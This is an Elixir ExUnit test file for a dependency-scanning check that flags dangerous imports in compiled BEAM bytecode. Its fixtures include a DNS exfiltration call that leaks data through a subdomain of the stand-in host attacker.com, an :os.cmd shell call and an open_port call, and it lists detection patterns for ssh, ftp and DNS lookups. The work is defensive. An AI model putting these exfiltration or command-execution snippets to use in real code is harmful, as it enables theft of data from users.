defmodule VetCore.Checks.BeamImportsTest do
  use ExUnit.Case, async: false

  alias VetCore.Checks.BeamImports
  alias VetCore.Types.Dependency

  setup do
    unique = System.unique_integer([:positive])
    tmp_dir = Path.join(System.tmp_dir!(), "vet_beam_imports_test_#{unique}")
    ebin_dir = Path.join([tmp_dir, "_build", "dev", "lib", "test_dep", "ebin"])
    File.mkdir_p!(ebin_dir)
    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: unique}
  end

  defp compile_to_ebin(source, module_name, ebin_dir) do
    [{^module_name, beam_bin}] = Code.compile_string(source)
    suffix = module_name |> Atom.to_string() |> String.replace_prefix("Elixir.", "")
    path = Path.join(ebin_dir, "#{suffix}.beam")
    File.write!(path, beam_bin)
    path
  end

  defp run(tmp_dir) do
    dep = %Dependency{name: :test_dep, version: "1.0.0", source: :hex}
    BeamImports.run(dep, tmp_dir, [])
  end

  test "no findings when _build is absent" do
    tmp = Path.join(System.tmp_dir!(), "vet_no_build_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp)
    on_exit(fn -> File.rm_rf!(tmp) end)

    assert run(tmp) == []
  end

  test "fires on :ssh import", %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: u} do
    module = Module.concat([Vet.BeamImportsTest, "Ssh#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Ssh#{u} do
      def go(host), do: :ssh.connect(host, 22, [])
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert Enum.any?(findings, &String.contains?(&1.description, ":ssh"))
    ssh_finding = Enum.find(findings, &String.contains?(&1.description, ":ssh"))
    assert ssh_finding.category == :bytecode_imports
    assert ssh_finding.severity == :critical
    assert ssh_finding.check_id == :beam_imports
  end

  test "fires on :inet_res (DNS exfil vector)", %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: u} do
    module = Module.concat([Vet.BeamImportsTest, "InetRes#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.InetRes#{u} do
      def leak(data), do: :inet_res.lookup(~c"\#{data}.attacker.com", :in, :a)
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert Enum.any?(findings, &String.contains?(&1.description, ":inet_res"))
  end

  test "fires on :prim_file import", %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: u} do
    module = Module.concat([Vet.BeamImportsTest, "PrimFile#{u}"])

    # :prim_file.read_file/1 exists in OTP; use it in a runtime path so it
    # appears in imports.
    source = """
    defmodule Vet.BeamImportsTest.PrimFile#{u} do
      def read(path), do: :prim_file.read_file(path)
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert Enum.any?(findings, &String.contains?(&1.description, ":prim_file"))
  end

  test "fires on :os.cmd", %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: u} do
    module = Module.concat([Vet.BeamImportsTest, "OsCmd#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.OsCmd#{u} do
      def whoami, do: :os.cmd(~c"whoami")
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert Enum.any?(findings, &String.contains?(&1.description, ":os.cmd"))
  end

  test "fires on erlang.open_port", %{tmp_dir: tmp_dir, ebin_dir: ebin_dir, unique: u} do
    module = Module.concat([Vet.BeamImportsTest, "Port#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Port#{u} do
      def go, do: :erlang.open_port({:spawn, ~c"cat"}, [])
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert Enum.any?(findings, &String.contains?(&1.description, "open_port"))
  end

  test "sees through defdelegate — target MFA in imports", %{
    tmp_dir: tmp_dir,
    ebin_dir: ebin_dir,
    unique: u
  } do
    module = Module.concat([Vet.BeamImportsTest, "Deleg#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Deleg#{u} do
      defdelegate connect(a, b, c), to: :ssh
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    # The defdelegate generates a function that calls :ssh.connect/3 directly;
    # the import table shows it.
    assert Enum.any?(findings, &String.contains?(&1.description, ":ssh"))
  end

  test "fires on $handle_undefined_function export", %{
    tmp_dir: tmp_dir,
    ebin_dir: ebin_dir,
    unique: u
  } do
    module = Module.concat([Vet.BeamImportsTest, "Sneaky#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Sneaky#{u} do
      def unquote(:"$handle_undefined_function")(name, args) do
        {name, args}
      end
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)

    finding =
      Enum.find(findings, fn f -> f.check_id == :beam_handle_undefined_function end)

    assert finding != nil
    assert finding.severity == :critical
    assert finding.category == :bytecode_imports

    assert String.contains?(
             finding.description,
             "$handle_undefined_function"
           )
  end

  test "safe module produces no bytecode_imports findings", %{
    tmp_dir: tmp_dir,
    ebin_dir: ebin_dir,
    unique: u
  } do
    module = Module.concat([Vet.BeamImportsTest, "Safe#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Safe#{u} do
      def add(a, b), do: a + b
      def greet(name), do: "hello \#{name}"
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)
    assert findings == []
  end

  test "erlang.apply/3 alone is not flagged at this layer", %{
    tmp_dir: tmp_dir,
    ebin_dir: ebin_dir,
    unique: u
  } do
    module = Module.concat([Vet.BeamImportsTest, "Apply#{u}"])

    source = """
    defmodule Vet.BeamImportsTest.Apply#{u} do
      def dispatch(m, f, a), do: :erlang.apply(m, f, a)
    end
    """

    compile_to_ebin(source, module, ebin_dir)

    findings = run(tmp_dir)

    # apply/3 appears in nearly every Elixir BEAM (GenServer callbacks,
    # Plug pipelines, Phoenix controllers all dispatch via apply). Layer 3
    # (BeamReflection) aggregates apply usage at density thresholds; the
    # per-import warning here was pure noise on legitimate framework code.
    assert findings == []
  end

  test "target_patterns/0 is exposed for coverage test" do
    patterns = BeamImports.target_patterns()
    assert is_list(patterns)
    # Wildcard modules use {:module, :*}
    assert {:ssh, :*} in patterns
    assert {:ftp, :*} in patterns
    assert {:inet_res, :*} in patterns
    # Specific dangerous MFAs
    assert {:os, :cmd} in patterns
    assert {:erlang, :open_port} in patterns
  end
end
